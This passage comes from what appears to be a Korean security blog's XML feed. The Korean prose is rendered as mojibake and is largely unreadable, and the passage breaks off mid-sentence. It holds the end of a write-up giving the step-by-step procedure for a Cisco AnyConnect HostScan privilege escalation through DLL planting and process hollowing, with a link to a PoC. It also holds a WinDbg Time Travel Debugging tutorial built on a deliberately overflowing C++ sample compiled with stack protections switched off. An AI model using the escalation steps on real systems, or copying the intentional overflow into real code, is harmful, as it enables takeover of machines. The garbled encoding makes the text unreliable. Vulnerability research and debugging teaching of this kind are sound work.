‰í„°ë¦¬ì—ì„œ <code>libhostscan.dll</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ ë¡œë“œë¥¼ ì‹œë„í•©ë‹ˆë‹¤. <code>libhostscan.dll</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ìì‹ ì˜ location pathì— ìœ„ì¹˜í•˜ì§€ ì•ŠëŠ” ì—¬ëŸ¬ DLLì„ ë¡œë“œí•©ë‹ˆë‹¤.(ex. IPHLPAPI.DLL)</p><p>LPEë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>libhostscan.dll</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì–´ë””ì— ìœ„ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•˜ê³  <code>%TEMP%\Cisco\Cisco HostScan</code> ë””ë ‰í„°ë¦¬ì— ë³µì‚¬í•©ë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” <code>%ProgramFiles(x86)%\Cisco\Cisco HostScan\lib</code>ì´ë‚˜ <code>%ProgramFile(x86)%\Cisco\Cisco AnyConnect Secure Mobility Client\Posture</code> ë””ë ‰í„°ë¦¬ì— ìˆìŠµë‹ˆë‹¤.</li><li>ì„œë¹„ìŠ¤ì˜ ì‹¤í–‰ íŒŒì¼(ciscod.exe)ì„ ì¼ì‹œ ì¤‘ì§€í•©ë‹ˆë‹¤.</li><li>ì¼ì‹œ ì¤‘ì§€ëœ í”„ë¡œì„¸ìŠ¤ì— <a href="https://attack.mitre.org/techniques/T1055/012/">process hollowing</a>ì„ ìˆ˜í–‰í•˜ê³  ì•„ë˜ì˜ ì„¸ ëª…ë ¹ì–´ë¥¼ 127.0.0.1:1023ìœ¼ë¡œ ë³´ë‚´ëŠ” í”„ë¡œì„¸ìŠ¤ë¡œ ë°”ê¿‰ë‹ˆë‹¤.<ul><li><code>%TEMP%\Cisco\Cisco HostScan</code> ë””ë ‰í„°ë¦¬ì—ì„œ <code>%PROGRAMFILES(x86)%\Cisco\Cisco HostScan\lib</code> ë””ë ‰í„°ë¦¬ë¡œ <code>libhostscan.dll</code>ë¥¼ ë³µì‚¬í•˜ëŠ” <code>priv_file_copy</code> ëª…ë ¹ì–´(ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì¡´ì¬í•˜ë©´ overwrite ë©ë‹ˆë‹¤.)</li><li><code>%TEMP%\Cisco\Cisco HostScan</code> ë””ë ‰í„°ë¦¬ì—ì„œ <code>PROGRAMFILES(x86)%\Cisco\Cisco HostScan\lib</code> ë””ë ‰í„°ë¦¬ë¡œ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” DLLì„ ë³µì‚¬í•˜ëŠ” <code>priv_file_copy</code> ëª…ë ¹ì–´(í•´ë‹¹ DLLì˜ ì´ë¦„ì€ IPHLPAPI.DLLì´ê³ , ì›ë³¸ DLLì˜ export functionì„ ë™ì¼í•˜ê²Œ export í•´ì•¼ í•©ë‹ˆë‹¤.)</li><li><code>priv_get_device_id</code> ëª…ë ¹ì–´</li></ul></li><li>ì¼ì‹œ ì¤‘ì§€ ìƒíƒœì—ì„œ ë‹¤ì‹œ ì‹œì‘ì‹œí‚µë‹ˆë‹¤.</li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>priv_file_copy</code> ëª…ë ¹ì— ë””ì§€í„¸ ì„œëª… í™•ì¸ì„ ì¶”ê°€í•¨ìœ¼ë¡œì¨ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. POCëŠ” <a href="https://www.coresecurity.com/core-labs/articles/analysis-cisco-anyconnect-posture-hostscan-local-privilege-escalation-cve-2021">coresecurity ë¸”ë¡œê·¸ì˜ í•´ë‹¹ ê²Œì‹œê¸€</a>ì—ì„œ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>idioth</tag>
      
      <tag>process hollowing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œ Part2</title>
    <link href="/2021/02/21/fabu1ous/ttd-2/"/>
    <url>/2021/02/21/fabu1ous/ttd-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-II-ë‘ë‘¥-ë“±ì¥"><a href="#Part-II-ë‘ë‘¥-ë“±ì¥" class="headerlink" title="Part II ë‘ë‘¥ ë“±ì¥"></a>Part II ë‘ë‘¥ ë“±ì¥</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/1.png"></p><p>ì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œ Part 1ì—ì„œ Windbg TTDë¥¼ ê°„ë‹¨íˆ ì‚´í´ë´¤ìŠµë‹ˆë‹¤. ì´ë²ˆ Part 2ì—ì„  TTDë¥¼ ì‚¬ìš©í•´ ê°„ë‹¨í•œ ë²„ê·¸ì˜ root causeë¥¼ ì°¾ì•„ë³´ë©´ì„œ TTDì™€ ì¹œí•´ì ¸ ë´…ì‹œë‹¤. Windbgë¥¼ í•œ ë²ˆë„ ì•ˆ ì¨ë³´ì…¨ê±°ë‚˜ Part 1ì„ ë³´ê³  ì‹¶ìœ¼ì‹  ë¶„ë“¤ì€ <a href="https://hackyboiz.github.io/2021/01/24/fabu1ous/ttd-1/">Part 1</a>ì„ ë³´ê³  ì˜¤ì„¸ìš”.</p><p>ìµœê·¼ì— L0chí˜•ì´ ê¸€ ì¡°íšŒìˆ˜ë¡œ ì ˆ ë†€ë¦¬ë”ë¼ê³ ìš”. ë„ì™€ì£¼ì‹­ì‡¼. ã…ã…</p><h1 id="ì¤€ë¹„ë¬¼-í•„ìˆ˜"><a href="#ì¤€ë¹„ë¬¼-í•„ìˆ˜" class="headerlink" title="ì¤€ë¹„ë¬¼(í•„ìˆ˜)"></a>ì¤€ë¹„ë¬¼(í•„ìˆ˜)</h1><ol><li>visual studio</li><li>windbg preview</li><li>ë¦¬ë²„ì‹± ì²˜ìŒ í•´ë³´ëŠ” ì²™í•  ìˆ˜ ìˆëŠ” ì—°ê¸°ë ¥</li></ol><h1 id="ìƒ˜í”Œ-ë§Œë“¤ê¸°"><a href="#ìƒ˜í”Œ-ë§Œë“¤ê¸°" class="headerlink" title="ìƒ˜í”Œ ë§Œë“¤ê¸°"></a>ìƒ˜í”Œ ë§Œë“¤ê¸°</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/2.png"></p><p>Visual studioë¡œ C++ ì½˜ì†” appì„ ë§Œë“¤ì–´ ì‹¤ìŠµ ìƒ˜í”Œì„ ë§Œë“¤ì–´ ë³´ê² ìŠµë‹ˆë‹¤. í”„ë¡œì íŠ¸ì˜ ì´ë¦„ ë° ì‹¤í–‰íŒŒì¼ì˜ ì´ë¦„ì€ ttd_part2ë¡œ í•˜ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetCppConGreeting</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">wchar_t</span> <span class="hljs-keyword">const</span>* <span class="hljs-keyword">const</span> message = <span class="hljs-string">L&quot;HELLO FROM THE WINDBG TEAM. GOOD LUCK IN ALL OF YOUR TIME TRAVEL DEBUGGING!&quot;</span>;    wcscpy_s(<span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>, message);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span> &lt;<span class="hljs-keyword">wchar_t</span>, 50&gt; greeting&#123;&#125;;    GetCppConGreeting(greeting.data(), <span class="hljs-keyword">sizeof</span>(greeting));    wprintf(<span class="hljs-string">L&quot;%ls\\n&quot;</span>, greeting.data());    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ì‹¤ìŠµì— ì‚¬ìš©í•  ë²„ê·¸ì˜ ì½”ë“œì…ë‹ˆë‹¤. greeting.data()ì— ë¬¸ìì—´ì„ ë³µì‚¬í•˜ê³  ì¶œë ¥í•˜ëŠ” ê°„ë‹¨í•œ ì˜ˆì œì…ë‹ˆë‹¤. ëŒ€ì¶© ì½”ë“œë§Œ ë´ë„ ì–´ë–¤ ë²„ê·¸ê°€ ë°œìƒí• ì§€ ëŠë‚Œì´ ì˜¤ì§€ë§Œ ê°€ë³ê²Œ ë¬´ì‹œí•©ì‹œë‹¤.</p><blockquote><p>Part2ëŠ” ì‹ ë¹„ì£¼ì˜ì•¼! Part2ëŠ” í˜¼ìë°–ì— ìƒê°í•˜ì§€ ì•Šì•„!</p><p>-ì´ê·¼-</p></blockquote><p><img src="/2021/02/21/fabu1ous/ttd-2/3.png"></p><p>ìš°ì„  ìœ„ ì½”ë“œë¥¼ ë¹Œë“œí•˜ê¸° ì „, ì‹¤ìŠµì— ë°©í•´ë˜ëŠ” ë³´í˜¸ ê¸°ë²•ê³¼ ë³´ì•ˆì„¤ì •ì„ êº¼ì¤ì‹œë‹¤.</p><p>ìƒë‹¨ ë©”ë‰´ &gt; í”„ë¡œì íŠ¸ &gt; ì†ì„± &gt; C/C++ &gt; SDL ê²€ì‚¬ &gt; ì•„ë‹ˆìš”(/sdl-)</p><p><img src="/2021/02/21/fabu1ous/ttd-2/4.png"></p><p>ìƒë‹¨ ë©”ë‰´ &gt; í”„ë¡œì íŠ¸ &gt; ì†ì„± &gt; C/C++ &gt; ì½”ë“œ ìƒì„±</p><ul><li>ê¸°ë³¸ ëŸ°íƒ€ì„ ê²€ì‚¬ : ê¸°ë³¸ê°’</li><li>ë³´ì•ˆ ê²€ì‚¬ : ë³´ì•ˆ ê²€ì‚¬ ì‚¬ìš© ì•ˆí•¨ (/GS-)</li></ul><p><img src="/2021/02/21/fabu1ous/ttd-2/build.png"></p><p>ìƒë‹¨ ë©”ë‰´ &gt; ë¹Œë“œ &gt; ì†”ë£¨ì…˜ ë¹Œë“œ</p><p>ë¹Œë“œ í›„ ttd_part2.exeë¥¼ ì‹¤í–‰í•´ ë³´ë©´ ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ ë¬¸ìì—´ í•˜ë‚˜ê°€ ì¶œë ¥ë©ë‹ˆë‹¤. ì‹¤ìŠµ í™˜ê²½ì— ë”°ë¼ Exceptionì´ë‚˜ Crashê°€ ë°œìƒí–ˆë‹¤ëŠ” ë©”ì„¸ì§€ ë°•ìŠ¤ê°€ ëœ° ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/5.png"></p><p>Windbg Previewë¥¼ tdd_part2.exeì— ë¶™ì—¬ì„œ ì‹¤í–‰í•´ë³´ë©´ Access violationì´ ë°œìƒí•œë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê°„ë‹¨íˆ ì‚´í´ë³´ë©´ EIPê°€ ì˜¤ì—¼ë¼ ìˆêµ°ìš”. </p><h1 id="Trace-File-ë§Œë“¤ê¸°"><a href="#Trace-File-ë§Œë“¤ê¸°" class="headerlink" title="Trace File ë§Œë“¤ê¸°"></a>Trace File ë§Œë“¤ê¸°</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/6.png"></p><p>Windbg Preview (ê´€ë¦¬ì ê¶Œí•œ) &gt; íŒŒì¼ &gt; Launch executable (advanced) &gt;</p><p>íƒ€ê²Ÿ(ttd_part2.exe) ì„ íƒ &gt; Record with TTD ì²´í¬ &gt; Configuer and Record</p><p>ì´ì œ ë§Œë“¤ì–´ë‘” ìƒ˜í”Œë¡œ ë³¸ê²©ì ì¸ ì‹¤ìŠµì„ ì‹œì‘í•´ ë´…ì‹œë‹¤. TTDì‚¬ìš©ì˜ ì²« ë‹¨ê³„ì¸ Trace File ë…¹í™”ë¥¼ í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/7.png"></p><p>Part 1ì—ì„œ ì € Record ë²„íŠ¼ì„ ëˆ„ë¥´ê³  ìµœëŒ€í•œ ë¹¨ë¦¬ ë¶„ì„í•˜ê³ ì í•˜ëŠ” ì´ìŠˆë¥¼ ë°œìƒì‹œì¼œì•¼ í•œë‹¤ê³  í–ˆì—ˆì£ ? ttd_part2.exeëŠ” ì‹¤í–‰ë§Œ ì‹œì¼œë„ í¬ë˜ì‰¬ê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— Record ë²„íŠ¼ì„ ëˆŒëŸ¬ ì£¼ì‹œê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤. ë”±íˆ ì¶”ê°€ë¡œ ì‹ ê²½ ì¨ ì¤„ê²Œ ì—†ìŠµë‹ˆë‹¤. </p><p><img src="/2021/02/21/fabu1ous/ttd-2/8.png"></p><p>ë…¹í™”ê°€ ëë‚˜ê³  TTDê°€ Trace file(<code>.run</code>)ì— ëŒ€í•œ IDX file(.idx)ì„ ìë™ìœ¼ë¡œ ìƒì„±í•˜ê³  ë‚˜ë©´ ë¶„ì„ ì¤€ë¹„ ë!</p><h1 id="Trace-File-ë¶„ì„í•˜ê¸°"><a href="#Trace-File-ë¶„ì„í•˜ê¸°" class="headerlink" title="Trace File ë¶„ì„í•˜ê¸°"></a>Trace File ë¶„ì„í•˜ê¸°</h1><pre><div class="caption"><span>text</span></div><code class="hljs plain">dx -r1 @$curprocess.TTD.Events</code></pre><p>dx ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ Trace Fileì— ë…¹í™”ëœ ëª¨ë“  ì´ë²¤íŠ¸ ëª©ë¡ì„ í™•ì¸í•´ ë´…ì‹œë‹¤. tdd_part2.exeê°€ ì‹¤í–‰ë˜ë©´ì„œ ë°œìƒí•œ í¼ì§ í¼ì§í•œ ì‚¬ê±´ë“¤ì„ í•œëˆˆì— ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë‹¨ Exceptionì´ ëˆˆì— ë„ë„¤ìš”.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/9.png"></p><p>ì¢Œì¸¡ì— ìˆëŠ” Index(<code>[0x9]</code>)ë¥¼ í´ë¦­í•´ Exceptionì— ëŒ€í•œ ì •ë³´ë¥¼ ì¶œë ¥í•´ ë´…ì‹œë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/10.png"></p><p>Time Travel Position, Exception Code, Exception Type ë“± Exceptionì— ëŒ€í•œ ê°„ë‹¨í•œ ì •ë³´ë¥¼ ì¶œë ¥í•´ ì¤ë‹ˆë‹¤. ì €í¬ê°€ ë¶„ì„í•˜ë ¤ëŠ” ì´ìŠˆëŠ” Program Counterê°€ <code>0x540020</code>ì¼ ë•Œ CPUê°€ ë˜ì§„ í•˜ë“œì›¨ì–´ Exceptionìœ¼ë¡œ Access Violationì— í•´ë‹¹í•¨ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì¡°ê¸ˆ ë” ìì„¸í•œ ì •ë³´ë¥¼ ì›í•˜ì‹œë©´ Exception í•„ë“œë¥¼ í´ë¦­í•´ Flag, RecordAddress ë“±ì˜ ì •ë³´ë„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/10-1.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">!tt ce:0</code></pre><p>[ Time Travel ]ë¥¼ í´ë¦­í•˜ê±°ë‚˜ <code>!tt</code>ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ í•´ë‹¹ Exceptionì´ ë°œìƒí•œ ì‹œì ìœ¼ë¡œ ì´ë™í•´ ë³¸ê²©ì ìœ¼ë¡œ ë¶„ì„ì„ ì‹œì‘í•´ ë´…ì‹œë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/12.png"></p><p>ë²„ê·¸ë‚˜ ì·¨ì•½ì ì„ ë¶„ì„í•  ë•Œ ëŒ€ë¶€ë¶„ ì œì¼ ë¨¼ì € í™•ì¸í•˜ê²Œ ë˜ëŠ” ê±´ ë ˆì§€ìŠ¤í„°ì˜ ìƒíƒœì…ë‹ˆë‹¤. ì¼ë‹¨ ëˆˆì— ë“¤ì–´ì˜¤ëŠ” ê²Œ 2ê°€ì§€ ìˆë„¤ìš”.</p><ol><li>EIP(Program Counter)ì˜ ìœ„ì¹˜ê°€ ì´ìƒí•˜ë‹¤.</li><li>ESPì™€ EBPì˜ ê±°ë¦¬ê°€ ë„ˆë¬´ ë©€ë‹¤.</li></ol><p>í¬ë˜ì‰¬ ì‹œì ì´ root causeì¼ë¦¬ ì—†ìœ¼ë‹ˆ EIPê°€ ì˜¤ì—¼ë˜ê¸° ì „ìœ¼ë¡œ ë˜ëŒë¦¬ë©´ì„œ root causeë¥¼ ì°¾ì•„ë´…ì‹œë‹¤.</p><p>ë„¤?  ì € ë‘ ê°œë§Œ ë´ë„ ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš°ì¸ ê±° ì•Œ ê±° ê°™ë‹¤ê³ ìš”? ê¸€ ì´ˆë°˜ë¶€ì— ì ì–´ ë†“ì€ 3ë²ˆì§¸ ì¤€ë¹„ë¬¼ì„ ë‹¤ì‹œ ì¤€ë¹„í•´ì˜¤ì‹œë©´ ë˜ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/13.png"></p><p>Part 1ì—ì„œ ë‹¤ë¤˜ë˜ ê²ƒì²˜ëŸ¼ TTDë¥¼ ì‚¬ìš©í•´ í”„ë¡œê·¸ë¨ì˜ ì‹¤í–‰ì„ ë˜ëŒë¦¬ëŠ” ë°©ë²•ì€ ë§ì§€ë§Œ â€œì²œ ë¦¬ ê¸¸ë„ í•œ ê±¸ìŒ ë¶€í„°â€ë¼ëŠ” ë§ì´ ìˆë“¯ì´ ìš°ì„  Step Into Back(ëª…ë ¹ì–´ â€œt-â€œ)ì„ ì‚¬ìš©í•´ í•œ ê±¸ìŒ(Step)ì”© ë˜ê°ì•„ ë´…ì‹œë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/14.png"></p><p>í—ˆí—ˆâ€¦ ì‹œì‘ì´ ë°˜ì´ë¼ê³  í¬ë˜ì‰¬ ì§ì „ì— ì‹¤í–‰í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ <code>main()</code>ì˜ retì´ë„¤ìš”. EIPê°€ ì˜¤ì—¼ëœ ì´ìœ ë¥¼ ì°¾ì•˜ìŠµë‹ˆë‹¤. ë²Œì¨ ë¶„ì„ ë‹¤í•œ ê±° ê°™ì€ ì´ ê¸°ë¶„! ë„ˆë¬´ í™€ê°€ë¶„í•˜êµ°ìš”.</p><blockquote><p>ë””ë²„ê±°ì—ê²ŒëŠ” ì‘ì€ í•œ ê±¸ìŒì´ì§€ë§Œ ë¦¬ë²„ì„œì—ê²ŒëŠ” ìœ„ëŒ€í•œ ë„ì•½ì´ë‹¤.</p><p>-ë‹ ì•”ìŠ¤íŠ¸ë¡±-</p></blockquote><p>ì•„ë§ˆ ESPì™€ EBPì˜ ê±°ë¦¬ê°€ ë¨¼ ì´ìœ ë„ <code>main()</code>ì˜ ì—í•„ë¡œê·¸ë¥¼ ì‹¤í–‰í•˜ë‹¤ê°€ EBPê°€ ì´ìƒí•œ ìœ„ì¹˜ë¡œ íŠ€ì–´ë²„ë¦°ê±°ê² ì£ ?</p><p><img src="/2021/02/21/fabu1ous/ttd-2/15.png"></p><p>Step Into Back(â€œt-â€œ)ì„ 2ë²ˆ ë” í•´ì¤ë‹ˆë‹¤. ì´ì œì•¼ EBP ìœ„ì¹˜ê°€ ë§ì´ ë˜ë„¤ìš”.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/16.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">dc ebp</code></pre><p>ebp ìœ„ì¹˜ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ë©”ëª¨ë¦¬ ìƒíƒœë¥¼ ì‚´í´ë³´ë©´ SFPì™€ RET ê°’ì´ ì¶œë ¥ ë©”ì„¸ì§€ë¡œ ì˜¤ì—¼ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¶„ëª…íˆ <code>main()</code> ì–´ë”˜ê°€ì—ì„œ ì¶œë ¥ ë©”ì„¸ì§€ê°€ stackì„ ì˜¤ì—¼ì‹œí‚¨ë‹¤ëŠ” ê±¸ ì•Œì•˜ìœ¼ë‹ˆ ê·¸ ì´ìœ ë¥¼ ì•Œì•„ë´…ì‹œë‹¤.</p><pre><div class="caption"><span>text</span></div><code class="hljs plain">ba &lt;access&gt; &lt;size&gt; &lt;address&gt; &#123;option&#125;</code></pre><p>ë°©ê¸ˆê¹Œì§€ ê±·ëŠ” ë²•ì„ ì•Œì•„ë´¤ìœ¼ë‹ˆ ì´ì   Breakpointë¥¼ ì‚¬ìš©í•´ ë›°ëŠ” ë²•ì„ ë°°ì›Œë´…ì‹œë‹¤. Windbgì˜ breakpointëŠ” íŠ¹ì • ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•  ë•Œ ê±¸ë¦¬ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>e : Execute</li><li>r : Read or Write</li><li>w : Write</li></ul><p>í˜„ì¬ EBPê°€ ê°€ë¦¬í‚¤ê³  ìˆëŠ” ë©”ëª¨ë¦¬ ìœ„ì¹˜(ì €ì˜ ê²½ìš°ì—ëŠ” 0x113fab4)ì— Write accessê°€ ë°œìƒí•  ë•Œ ê±¸ë¦¬ëŠ” breakpointë¥¼ ê±¸ì–´ì•¼ í•©ë‹ˆë‹¤.</p><pre><div class="caption"><span>text</span></div><code class="hljs plain">ba w4 0113fab4</code></pre><p><img src="/2021/02/21/fabu1ous/ttd-2/17.png"></p><p>Breakpointë¥¼ ê±¸ê³  Go Back(ëª…ë ¹ì–´ â€œg-â€œ)ë¥¼ í•´ë´…ì‹œë‹¤. <code>ucrtbased!common_tcscpy_s&lt;wchar_t&gt;+0x187</code>ì— ë˜ê°ê¸°ê°€ ë©ˆì¶”ë„¤ìš”.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/18.png"></p><p>ìŠ¤íƒì˜ ìƒí™©ì„ ì‚´í´ë´…ì‹œë‹¤.</p><p>main() â†’ GetCppGreeting() â†’ wcscpy_s()</p><p><code>main()</code>ì˜ ìŠ¤íƒ í”„ë ˆì„ì´ ë§ê°€ì¡Œìœ¼ë‹ˆ ì €í¬ê°€ ì‘ì„±í•œ <code>GetCppConGreeting()</code>ì— root causeê°€ ìˆì„ í™•ë¥ ì´ ë†’ìŠµë‹ˆë‹¤.</p><p>ì´ ì‹œì ì—ì„œ ê°œë°œìë¼ë©´ <code>GetCppConGreeting()</code>ì˜ ì½”ë“œë¥¼ ì—´ì–´ ë³¼í…Œê³ , ì €ê°™ì´ ë²„ê·¸ ë°”ìš´í‹°ê°€ ëª©ì ì´ë¼ë©´ IDAë¥¼ ì‚¬ìš©í•´ ì •ì  ë¶„ì„ì„ í•˜ê² ì§€ë§Œ TTDì— ì§‘ì¤‘í•˜ê¸° ìœ„í•´ ì¢€ ë” TTDë¥¼ ì¨ë´…ì‹œë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/19.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">dx &amp;ttd_part2!GetCppConGreetingbu &amp;ttd_part2!GetCppConGreeting</code></pre><p>ë²„ê·¸ê°€ ë°œìƒí•  ê±°ë¼ ì˜ì‹¬ë˜ëŠ” <code>GetCppGreeting()</code>ì˜ ì‹œì‘ ì£¼ì†Œì— breakpointë¥¼ ê±¸ê³ </p><p><img src="/2021/02/21/fabu1ous/ttd-2/20.png"></p><p>ì•„ê¹Œ ìŠ¤íƒì´ ì˜¤ì—¼ë˜ëŠ” ì‹œì ì„ ì°¾ê¸° ìœ„í•´ ê±¸ì–´ì¤¬ë˜ breakpointëŠ” ì‚­ì œí•´ì¤ì‹œë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/21.png"></p><p>ê·¸ë¦¬ê³  í”„ë¡œê·¸ë¨ ì‹œì‘ ì§€ì ìœ¼ë¡œ ëŒì•„ê°€ Go(ëª…ë ¹ì–´ â€œgâ€)ë¥¼ í†µí•´ <code>GetCppConGreeting()</code>ì˜ í”„ë¡¤ë¡œê·¸ë¡œ ì´ë™í•´ì¤ì‹œë‹¤. EAXê°€ ëˆˆì— ë“¤ì–´ì˜¤ëŠ”ë° ì•„ë§ˆ ì €ê¸°ê°€ ì¶œë ¥ ë¬¸ìì—´ì´ ë³µì‚¬ë˜ëŠ” Destinationì´ê² ì£ ?</p><p><img src="/2021/02/21/fabu1ous/ttd-2/22.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">gu</code></pre><p><code>GetCppConGreeting()</code>ì´ ì‹¤í–‰ì„ ë§ˆì¹˜ê³  ë‹¤ì‹œ <code>main()</code>ìœ¼ë¡œ ë¦¬í„´í•œ ì§í›„ ìœ„ì—ì„œ í™•ì¸í–ˆë˜ EAX ìœ„ì¹˜ë¥¼ ì‚´í´ë³´ë©´ ì˜ˆìƒí–ˆë˜ ê²ƒì²˜ëŸ¼ Destinationì´ ë§ìŠµë‹ˆë‹¤. <code>GetCppConGreeting()</code>ì˜ ë‹¤ë¥¸ íŒŒë¼ë¯¸í„°ë“¤ì„ í™•ì¸í•´ ë³´ë©´ root causeë¥¼ ì°¾ì„ ìˆ˜ ìˆì„ ê±° ê°™êµ°ìš”.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/23.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">!tt 0gg-uub eip</code></pre><p>ë‹¤ì‹œ<code>GetCppConGreeting()</code>ì˜ í˜¸ì¶œ ì‹œì ìœ¼ë¡œ ì´ë™í•œ í›„ â€œg-uâ€ë¥¼ ì‚¬ìš©í•´ í˜¸ì¶œ ì§ì „ìœ¼ë¡œ ë˜ëŒë ¤ì¤ë‹ˆë‹¤. ì—¬ê¸°ì„œ í˜„ì¬ EIPë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì–´ë–¤ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì„ ì‹¤í–‰í–ˆëŠ”ì§€ í™•ì¸í•´ ë³´ë©´ <code>GetCppConGreeting( [EAX], 0x64 )</code>, ì¦‰ ì•„ê¹Œ í™•ì¸í–ˆë˜ Destinationê³¼ 0x64(100)ê°€ íŒŒë¼ë¯¸í„°ì¸ê±¸ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/24.png"></p><p><img src="/2021/02/21/fabu1ous/ttd-2/25.png"></p><p>ë§Œì•½ ì‹¬ë³¼ì´ ì‚´ì•„ìˆëŠ” ì‹¤í–‰íŒŒì¼ì„ ë¶„ì„ ì¤‘ì´ë¼ë©´ ìƒë‹¨ ë©”ë‰´ &gt; Watch ë ˆì´ë¸”ì„ ì‚¬ìš©í•´ ì¡°ê¸ˆ ë” ì‰½ê²Œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/26.png"></p><p><img src="/2021/02/21/fabu1ous/ttd-2/27.png"></p><p><code>GetCppConGreeting()</code>ì˜ ì²« ë²ˆì§¸ íŒŒë¼ë¯¸í„° dest_buf(<code>0x113fa50</code>)ë¥¼ ì‚´í´ë´…ì‹œë‹¤. í¬ê¸°ëŠ” 100 bytes ë„¤ìš”? 100 bytes ë²„í¼ì— size 100 ë§Œí¼ ë¬¸ìì—´ì„ ë³µì‚¬í•˜ëŠ” ë“¯í•œë° ì™œ ë²„ê·¸ê°€ ë°œìƒí•˜ëŠ” ê±¸ê¹Œìš”? ì„¤ë ¹ Stack overflowê°€ ë°œìƒí•´ë„ SFPë§Œ ì˜¤ì—¼ë˜ì•¼ í•  ìƒí™© ê°™ì€ë° RETì´ ì˜¤ì—¼ë  ì´ìœ ëŠ” ì—†ì–´ ë³´ì…ë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/28.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">uf ttd_part2!GetCppConGreeting</code></pre><p><code>GetCppConGreeting()</code> í•¨ìˆ˜ì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì„ ì‚´í´ë´…ì‹œë‹¤. ë¬¸ìì—´ì„ ë³µì‚¬í•  ë•Œ Wide characterë¥¼ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜<code> 